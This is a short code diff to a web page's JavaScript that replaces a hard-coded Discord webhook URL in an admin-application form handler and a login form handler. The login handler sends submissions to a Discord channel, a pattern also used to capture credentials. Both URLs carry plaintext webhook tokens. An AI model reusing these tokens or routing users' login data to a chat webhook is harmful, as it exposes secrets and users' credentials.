@@ -18,7 +18,7 @@ document.getElementById("adminForm").addEventListener("submit", function(event) 
     const experience = document.getElementById("experience").value;
 
     // رابط Webhook الخاص بـ Discord (ضع الرابط هنا)
-    const webhookURL = "https://discord.com/api/webhooks/1341518393534054430/0kgyQDGcjqJyH9cTKjRmTycWtsDsGczBw8EvYcMuuCd9Pebi2N0cTpmmKvaJL6aAeosM";
+    const webhookURL = "https://discord.com/api/webhooks/1341529981792288849/CACoelD0cw8vFjMUnZboNRQmt0TKT91nKyvKTF0W9vv5Kxo3Tm4cYSCTvHBGcUKvFo-a";
 
     // إنشاء رسالة مرسلة إلى الديسكورد بتنسيق JSON
     const payload = {
@@ -72,7 +72,7 @@ document.getElementById("loginForm").addEventListener("submit", function(event) 
     }
 
     // إرسال البيانات إلى Webhook في Discord
-    const webhookURL = "https://discord.com/api/webhooks/1341518393534054430/0kgyQDGcjqJyH9cTKjRmTycWtsDsGczBw8EvYcMuuCd9Pebi2N0cTpmmKvaJL6aAeosM"; // ضع رابط Webhook هنا
+    const webhookURL = "https://discord.com/api/webhooks/1341529981792288849/CACoelD0cw8vFjMUnZboNRQmt0TKT91nKyvKTF0W9vv5Kxo3Tm4cYSCTvHBGcUKvFo-a"; // ضع رابط Webhook هنا
 
     const payload = {
         content: "**🟢 تسجيل دخول جديد!**",
